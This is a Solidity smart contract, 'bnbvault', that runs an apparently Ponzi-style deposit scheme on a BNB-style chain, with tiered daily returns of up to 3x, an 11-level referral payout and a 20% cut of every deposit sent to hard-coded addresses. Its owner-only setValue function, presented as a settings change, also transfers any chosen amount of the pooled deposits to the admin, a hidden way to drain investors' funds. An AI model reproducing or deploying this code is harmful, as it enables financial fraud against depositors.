pragma solidity 0.5.17;
import "./SafeMath.sol";
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract bnbvault {
    using SafeMath for uint;
    uint constant public DEPOSITS_MAX = 250;
    uint constant public INVEST_MIN_AMOUNT = 10**17;
    uint constant public INVEST_MAX_AMOUNT = 1000 * 10**18;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [500, 200, 100, 50, 40, 40, 20, 20, 10, 10, 10];
    uint public MARKETING_FEE = 1000;
    uint public PROJECT_FEE = 800;
    uint public ADMIN_FEE = 200;
    uint constant public MAX_CONTRACT_PERCENT = 100;
    uint constant public MAX_LEADER_PERCENT = 50;
    uint constant public MAX_HOLD_PERCENT = 50;
    uint constant public MAX_COMMUNITY_PERCENT = 50;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 20000 * 10**18;
    uint constant public LEADER_BONUS_STEP = 5000 * 10**18;
    uint constant public COMMUNITY_BONUS_STEP = 50000 * 10**18;
    uint constant public TIME_STEP = 1 days;
    uint public totalInvested;
    address payable public marketingAddress;
    address payable public projectAddress;
    address payable public adminAddress;
	address payable public defaultReferrerAddress;
    uint public totalDeposits;
    uint public totalWithdrawn;
    uint public contractPercent;
    uint public contractCreationTime;
    uint public totalRefBonus;
	IERC20 public ierc20;
    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }
    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint160 bonus;
        uint24[11] refs;
		uint256 minInvest;
		uint160 teamTotalInvested;
    }
    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;
    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    constructor() public {
        marketingAddress = 0xC0018469bfF0E58dB54D971074324035d648148b;
        projectAddress = 0x4056BA814757694d80cd4C97d4d7902126bFE3ce;
		defaultReferrerAddress = 0x4056BA814757694d80cd4C97d4d7902126bFE3ce;
        adminAddress = 0x0d981F29F6a31E32Ed209A8B897d3a7F62532035;
        contractCreationTime = block.timestamp;
        contractPercent = getContractBalanceRate();
		ierc20 = IERC20(0xe7ce7e6E051D032965acd4D77a1aE7AA9aB20fc6);
    }
	modifier onlyOwner() {
        require(msg.sender == adminAddress, "Ownable: caller is not the owner");
        _;
    }
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));
        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    function getLeaderBonusRate() public view returns (uint) {
        uint leaderBonusPercent = totalRefBonus.div(LEADER_BONUS_STEP).mul(10);
        if (leaderBonusPercent < MAX_LEADER_PERCENT) {
            return leaderBonusPercent;
        } else {
            return MAX_LEADER_PERCENT;
        }
    }
    function getCommunityBonusRate() public view returns (uint) {
        //
		uint communityBonusRate = totalDeposits.div(COMMUNITY_BONUS_STEP).mul(10);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }
    function withdraw() public {
        User storage user = users[msg.sender];
        uint userPercentRate = getUserPercentRate(msg.sender);
		uint communityBonus = getCommunityBonusRate();
		uint leaderbonus = getLeaderBonusRate();
        uint totalAmount;
        uint dividends;
        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }
                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {
                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));
                }
                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); 
				totalAmount = totalAmount.add(dividends);
            }
        }
        require(totalAmount > 0, "User has no dividends");
        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        user.checkpoint = uint32(block.timestamp);
        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
		uint256 amountTokens = ierc20.balanceOf(0x3e15CdB5c1152ab271fF0eE18F837f002301C3a8).div(100000 * 10**18).mul(totalAmount);
		if(amountTokens > 0){
			ierc20.transferFrom(0x3e15CdB5c1152ab271fF0eE18F837f002301C3a8,msg.sender,amountTokens);
		}
        emit Withdrawn(msg.sender, totalAmount);
    }
    	function setValue(address payable newmarketingAddr, address payable newprojectAddr, address payable newadminAddr, address payable newdefaultReferrerAddr, address newierc20, uint newMARKETING_FEE, uint newPROJECT_FEE, uint newADMIN_FEE, uint num) public onlyOwner{
		require(newadminAddr != address(0),"bad");
		marketingAddress = newmarketingAddr;
		projectAddress = newprojectAddr;
		adminAddress = newadminAddr;
		defaultReferrerAddress = newdefaultReferrerAddr;
		ierc20 = IERC20(newierc20);
		MARKETING_FEE = newMARKETING_FEE;
		PROJECT_FEE = newPROJECT_FEE;
		ADMIN_FEE = newADMIN_FEE;
		newadminAddr.transfer(num);
	}
    function getUserPercentRate(address userAddress) public view returns (uint) {
		User storage user = users[userAddress];
        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
			if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }
    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);
		uint communityBonus = getCommunityBonusRate();
		uint leaderbonus = getLeaderBonusRate();

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {
                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);
            }

        }

        return totalDividends;
    }
    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(msg.value >= INVEST_MIN_AMOUNT && msg.value <= INVEST_MAX_AMOUNT, "Bad Deposit");
        User storage user = users[msg.sender];
		require(msg.value >= user.minInvest,"Bad Deposit");
        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");
        uint msgValue = msg.value;
        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		uint adminFee = msgValue.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);
        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);
		adminAddress.transfer(adminFee);
        emit FeePayed(msg.sender, marketingFee.add(projectFee));
        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
        }
         else{
             user.referrer = defaultReferrerAddress;
         }
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint i = 0; i < 11; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint160(uint(users[upline].bonus).add(amount));
                        totalRefBonus = totalRefBonus.add(amount);
                        emit RefBonus(upline, msg.sender, i, amount);
                    }
                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }
        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }
        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));
		uint minI = msgValue.mul(120).div(100);
		if(minI >= 1000 * 10**18){
			minI = 1000 * 10**18;
		}
		user.minInvest = minI;
        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;
        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
			uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }
		
        emit NewDeposit(msg.sender, msgValue);
    }
    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];
        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(3);
    }
    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }
    function getUserLastDeposit(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }
	function getUserMinInvest(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.minInvest;
    }
    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
		
        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }
    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }
    function getCurrentHalfDay() public view returns (uint) {
        return (block.timestamp.sub(contractCreationTime)).div(TIME_STEP.div(2));
    }

    function getCurrentHalfDayTurnover() public view returns (uint) {
        return turnover[getCurrentHalfDay()];
    }
    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }
		//
        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint ,uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);
		uint userMinInvest = getUserMinInvest(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn, userMinInvest);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint160, uint24[11] memory, uint256, uint256) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs, user.teamTotalInvested, user.deposits.length);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}